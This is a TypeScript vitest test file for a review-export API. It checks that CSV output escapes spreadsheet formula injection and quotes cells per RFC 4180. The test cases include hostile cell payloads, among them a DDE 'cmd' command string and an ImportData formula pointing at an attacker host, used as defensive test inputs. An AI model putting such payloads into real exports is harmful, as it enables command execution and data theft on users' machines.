/* eslint-disable @typescript-eslint/no-explicit-any */
import { describe, it, expect, vi, beforeEach } from 'vitest';

vi.mock('@/lib/auth-guard', () => ({
  requireAuth: vi.fn(),
  authError: vi.fn((r: any) => Response.json({ error: r.error }, { status: r.status })),
}));

vi.mock('@/lib/prisma', () => ({
  prisma: {
    review: { findMany: vi.fn() },
  },
}));

import { requireAuth } from '@/lib/auth-guard';
import { prisma } from '@/lib/prisma';
import { GET } from '@/app/api/reviews/export/route';

const mockRequireAuth = vi.mocked(requireAuth);
const mockFindMany = vi.mocked(prisma.review.findMany);

async function runCSV(rows: any[]) {
  mockRequireAuth.mockResolvedValue({
    session: { user: { id: 'u1', isAdmin: true } },
    userId: 'u1',
  } as any);
  mockFindMany.mockResolvedValue(rows as any);
  const res = await GET(new Request('http://x/api/reviews/export?format=csv&scope=individual') as any);
  expect(res.status).toBe(200);
  return res.text();
}

function baseRow(overrides: Partial<Record<string, unknown>>) {
  return {
    id: 'r1',
    reviewType: 'WEEKLY',
    isTeamReview: false,
    scheduledDate: new Date('2026-05-01T00:00:00Z'),
    completedAt: new Date('2026-05-01T12:00:00Z'),
    user: { name: 'Alice', email: 'a@x.com' },
    notes: 'nothing scary',
    checklistState: null,
    ...overrides,
  };
}

describe('CSV export — formula-injection defense (Critical #11)', () => {
  beforeEach(() => vi.clearAllMocks());

  it('prepends UTF-8 BOM (raw bytes) and uses CRLF line endings', async () => {
    mockRequireAuth.mockResolvedValue({
      session: { user: { id: 'u1', isAdmin: true } },
      userId: 'u1',
    } as any);
    mockFindMany.mockResolvedValue([baseRow({})] as any);
    const res = await GET(new Request('http://x/api/reviews/export?format=csv&scope=individual') as any);
    const buf = new Uint8Array(await res.arrayBuffer());
    // UTF-8 BOM is EF BB BF. Response.text() would strip it on decode, so we
    // check raw bytes instead.
    expect(buf[0]).toBe(0xef);
    expect(buf[1]).toBe(0xbb);
    expect(buf[2]).toBe(0xbf);
    const text = new TextDecoder('utf-8', { ignoreBOM: true }).decode(buf);
    expect(text).toContain('\r\n');
    expect(text).not.toContain('\n\r');
  });

  it.each([
    ['=cmd|\'/c calc\'!A1', "'=cmd|'/c calc'!A1"], // single quotes don't trigger rfc4180
    ['-2+3', "'-2+3"],                             // clean, no rfc4180
  ])('prefixes "%s" with a single quote without rfc4180 wrap', async (notes, expected) => {
    const text = await runCSV([baseRow({ notes })]);
    expect(text).toContain(expected);
    expect(text).not.toContain(`,"${expected}"`); // not wrapped
  });

  it.each([
    ['+SUM(1,2)'],                                 // has comma -> rfc4180 wraps
    ['@ImportData("http://attacker/...")'],        // has "   -> rfc4180 wraps + doubles
    ['\t=WEBSERVICE("...")'],                      // has "   -> rfc4180 wraps + doubles
    ['\rinnocent-looking'],                        // has \r  -> rfc4180 wraps
  ])('prefixes + rfc4180-wraps "%s"', async (notes) => {
    const text = await runCSV([baseRow({ notes })]);
    // Formula escape applied AND outer quotes applied (rfc 4180 requires
    // quoting any cell containing comma/quote/CR/LF). The cell appears as
    // `"'<payload-with-doubled-quotes>"`.
    const expectedInner = notes.replace(/"/g, '""');
    expect(text).toContain(`"'${expectedInner}"`);
  });

  it('preserves a leading "=" that comes via user.name (another attack surface)', async () => {
    const text = await runCSV([baseRow({ user: { name: '=HYPERLINK("x","y")', email: 'a@x.com' } })]);
    // The name field gets formula-escape + rfc4180 quoting (because it also has commas).
    expect(text).toMatch(/"'=HYPERLINK/);
  });

  it('leaves benign fields untouched', async () => {
    const text = await runCSV([baseRow({ notes: 'All good' })]);
    expect(text).toContain(',All good,');
    expect(text).not.toContain("'All good");
  });

  it('quotes values containing commas or quotes (RFC 4180) without mangling them', async () => {
    const text = await runCSV([baseRow({ notes: 'a,b,c' })]);
    expect(text).toContain('"a,b,c"');
    const text2 = await runCSV([baseRow({ notes: 'quoth "the raven"' })]);
    expect(text2).toContain('"quoth ""the raven"""');
  });

  it('quotes a lone CR inside a field (formula and rfc4180 both apply)', async () => {
    // '\r' is also a formula trigger, and rfc4180 requires quoting any CR-
    // or LF-bearing field. Both pieces must apply.
    const text = await runCSV([baseRow({ notes: '\rinj' })]);
    expect(text).toContain('"\'\rinj"');
  });
});
